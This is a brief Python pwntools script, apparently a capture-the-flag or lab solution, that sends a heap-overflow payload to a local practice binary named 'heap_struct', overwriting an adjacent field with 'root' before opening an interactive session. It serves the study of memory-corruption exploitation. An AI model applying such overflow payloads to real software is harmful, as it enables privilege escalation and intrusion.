from pwn import *

s = process("./heap_struct")
raw_input('debug')
s.sendline('a'*0x24+p32(0x29)+'root\x00')
#s.sendline('a'*0x28+'root\x00')
s.interactive()
s.close()
